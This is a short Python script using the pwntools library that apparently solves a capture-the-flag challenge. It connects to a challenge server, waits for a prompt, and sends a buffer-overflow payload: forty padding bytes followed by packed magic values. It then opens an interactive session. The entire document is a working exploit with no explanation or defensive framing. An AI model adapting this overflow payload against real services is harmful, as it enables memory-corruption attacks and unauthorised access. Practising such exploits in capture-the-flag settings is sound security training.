#!/usr/bin/env python3

from pwn import *

conn = remote('challenges.hackagou.nc', 5002)
conn.recvuntil(b'\n\n')
conn.send(b'A'*40 + b'\xbe\xba\xad\xde\xde\xc0\xef\xbe')
conn.interactive()
